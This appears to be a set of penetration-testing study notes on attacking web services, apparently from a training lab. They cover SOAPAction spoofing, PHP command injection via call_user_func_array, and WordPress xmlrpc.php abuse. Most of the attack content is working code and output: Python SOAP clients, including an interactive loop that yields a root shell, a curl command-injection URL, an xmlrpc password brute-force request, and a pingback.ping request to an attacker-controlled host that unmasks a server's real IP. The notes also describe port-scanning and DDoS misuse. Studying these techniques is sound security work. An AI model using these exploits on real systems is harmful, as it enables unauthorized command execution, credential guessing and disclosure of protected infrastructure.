## Table of Contents

- [1. SOAPAction Spoofing](#1-soapaction-spoofing)
  - [1.1 - Initial Attack Attempt](#11---initial-attack-attempt)
  - [1.2 - SOAPAction Spoofing Bypass](#12---soapaction-spoofing-bypass)
  - [1.3 - Automation](#13---automation)
- [2. Command Injection](#2-command-injection)
- [3. Attacking WordPress 'xmlrpc.php'](#3-attacking-wordpress-xmlrpcphp)
  - [3.1 - xmlrpc.php](#31---xmlrpcphp)
  - [3.2 - pingback.ping](#32---pingbackping)

## 1. SOAPAction Spoofing

**Suppose** we are assessing a SOAP web service, whose WSDL file resides in `http://<TARGET IP>:3002/wsdl?wsdl`.

The service's WSDL file can be found by:

```
$ curl http://<TARGET IP>:3002/wsdl?wsdl 

<?xml version="1.0" encoding="UTF-8"?>
<wsdl:definitions targetNamespace="http://tempuri.org/" 
  xmlns:s="http://www.w3.org/2001/XMLSchema" 

...<SNIP>...

 <!-- SOAP ExecuteCommand Action -->
    <wsdl:operation name="ExecuteCommand">
      <soap:operation soapAction="ExecuteCommand" style="document"/>
      
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
    
    
  </wsdl:binding>

...<SNIP>...

```

The first thing to pay attention to is the following

```
<wsdl:operation name="ExecuteCommand">
<soap:operation soapAction="ExecuteCommand" style="document"/>
```

We can see a SOAPAction operation called ExecuteCommand. Look at the parameters:

```
<s:element name="ExecuteCommandRequest">
<s:complexType>
<s:sequence>
<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
```

We notice that there is a `cmd` parameter. Let us build a Python script to issue requests.

### 1.1 - Initial Attack Attempt

Create `client.py` to exploit the *cmd* parameter:

```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

**Result**: If the result is Error - "This function is only allowed in internal networks". Then, try **SOAPAction Spoofing Bypass**

### 1.2 - SOAPAction Spoofing Bypass

Create `client_soapaction_spoofing.py`:

```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

**Key Points**:
- Uses *LoginRequest* in soap:Body (allowed operation)
- Includes *ExecuteCommand* parameters (cmd)
- Specifies *ExecuteCommand* in SOAPAction header

**Result**: If the payload successfully executes `whoami` command, returning `root` - bypassing restrictions through SOAPAction spoofing. Try auto the process with the next step.

### 1.3 - Automation 

Create `auto.py`:

```
import requests

while True:
    cmd = input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

From here, we can execute it as follows:

```
$ python3 automate.py
$ id
b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><success>true</success><result>uid=0(root) gid=0(root) groups=0(root)\n</result></LoginResponse></soap:Body></soap:Envelope>'
$
```

## 2. Command Injection

**Suppose we are assessing such a connectivity-checking service** residing in `http://<TARGET IP>:3003/ping-server.php/ping`. **Suppose we have also been provided with the source code of the service**:

**Note:** The web service we are about to assess does not follow the web service architectural designs/approaches we covered. It is quite close to a normal web service, though, as it provides its functionality in a programmatic way, and different clients can use it for connectivity-checking purposes.

```
<?php
function ping($host_url_ip, $packets) {
        if (!in_array($packets, array(1, 2, 3, 4))) {
                die('Only 1-4 packets!');
        }
        $cmd = "ping -c" . $packets . " " . escapeshellarg($host_url_ip);
        $delimiter = "\n" . str_repeat('-', 50) . "\n";
        echo $delimiter . implode($delimiter, array("Command:", $cmd, "Returned:", shell_exec($cmd)));
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $prt = explode('/', $_SERVER['PATH_INFO']);
        call_user_func_array($prt[1], array_slice($prt, 2));
}
?>
```

- A function called `ping` is defined, which takes two arguments `host_url_ip` and `packets`.
- The request should look similar to the following. `http://<TARGET IP>:3003/ping-server.php/ping/<VPN/TUN Adapter IP>/3`.
- To check that the web service is sending ping requests, execute the below in your attacking machine and then issue the request:

```
$ sudo tcpdump -i tun0 icmp
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 11:10:22.521853 IP 10.129.202.133 > 10.10.14.222: ICMP echo request, id 1, seq 1, length 64
 11:10:22.521885 IP 10.10.14.222 > 10.129.202.133: ICMP echo reply, id 1, seq 1, length 64
 11:10:23.522744 IP 10.129.202.133 > 10.10.14.222: ICMP echo request, id 1, seq 2, length 64
 11:10:23.522781 IP 10.10.14.222 > 10.129.202.133: ICMP echo reply, id 1, seq 2, length 64
 11:10:24.523726 IP 10.129.202.133 > 10.10.14.222: ICMP echo request, id 1, seq 3, length 64
 11:10:24.523758 IP 10.10.14.222 > 10.129.202.133: ICMP echo reply, id 1, seq 3, length 64
```

* The code validates that *packets* is 1-4 via an array check. Requests like `http://<TARGET IP>:3003/ping-server.php/ping/<VPN/TUN Adapter IP>/3333` return *Only 1-4 packets!* error.

* A *cmd* variable forms the ping command using *packets* and *host_url* values. The *host_url* is escaped with escapeshellarg() to prevent shell injection by adding single quotes and escaping existing quotes. If the `host_url`'s value was not escaped, the below could happen:

* <img width="865" height="74" alt="image" src="https://github.com/user-attachments/assets/0e0fbe3d-3e34-492b-b391-839b3ae732c2" />

* The command executes via *shell_exec()* PHP function.

* For GET requests, call_user_func_array() can call existing PHP functions. Instead of `http://<TARGET IP>:3003/ping-server.php/ping/www.example.com/3`, attackers can use `http://<TARGET IP>:3003/ping-server.php/system/ls` for command injection.

* You can test the command injection vulnerability as follows:

```shell-session
$ curl http://<TARGET IP>:3003/ping-server.php/system/ls
index.php
ping-server.php
```

## 3. Attacking WordPress 'xmlrpc.php'

### 3.1 - xmlrpc.php

**Note:** xmlrpc.php being enabled on a WordPress instance is not a vulnerability. Depending on the methods allowed, xmlrpc.php can facilitate some enumeration and exploitation activities, though.

- Suppose we are assessing the security of a WordPress instance residing in `http://blog.inlanefreight.com`.
- Through enumeration activities, we identified a valid username, `admin`, and that `xmlrpc.php` is **enabled**. (Identifying if `xmlrpc.php` is **enabled** is as easy as requesting xmlrpc.php on the domain we are assessing.)
- First, we use `system.listMethods` to enumerate available methods:
```
$ curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  ...<SNIP>...
  <value><string>wp.getUsersBlogs</string></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

- Investigate those methods (try with chat-gpt), as some might prodive **Authentication Brute-force Vectors**, and/or **Post-authentication Dangerous Methods**, and/or **Recon/Enumeration Vectors**.
- From here, notice that `wp.getUsersBlogs` method
- We can brute-force passwords through `xmlrpc.php` using the `wp.getUsersBlogs` method: `$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php`.
- If **Successful Login**: Returns XML response with blog details and `isAdmin` flag. If **Failed Login**: Returns `403 faultCode` error with "Incorrect username or password."

### 3.2 - pingback.ping

**Note:** Inside the list of available methods above, `pingback.ping` is **included**. `pingback.ping` allows for XML-RPC pingbacks. According to WordPress, a pingback is a special type of comment that’s created when you link to another blog post, as long as the other blog is set to accept pingbacks.

The `pingback.ping` method in WordPress xmlrpc allows pingbacks - comments created when linking to other blog posts. This functionality can be exploited for:

**IP Disclosure** - Attackers can call `pingback.ping` on WordPress instances behind Cloudflare to reveal the real public IP by pointing pingbacks to attacker-controlled hosts.

**Cross-Site Port Attack (XSPA)** - Attackers can use `pingback.ping` to scan internal hosts and ports by targeting the WordPress instance itself or internal networks, identifying open ports through response time and content differences.

**DDoS Attacks** - Attackers can weaponize multiple WordPress instances to call `pingback.ping` simultaneously against a single target, creating a distributed denial of service attack.

#### IP Disclosure Attack Example:

When WordPress at *http://blog.inlanefreight.com* is behind Cloudflare with `xmlrpc.php` and `pingback.ping` enabled, attackers can expose the real IP by sending:

```
POST /xmlrpc.php HTTP/1.1 
Host: blog.inlanefreight.com 
Content-Length: 293

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://attacker-controlled-host.com/</string></value>
</param>
<param>
<value><string>https://blog.inlanefreight.com/2015/10/what-is-cybersecurity/</string></value>
</param>
</params>
</methodCall>
```

This request forces the WordPress server to send a pingback verification request to the attacker's host, revealing the true IP address bypassing Cloudflare protection. XSPA and DDoS attacks follow similar patterns.









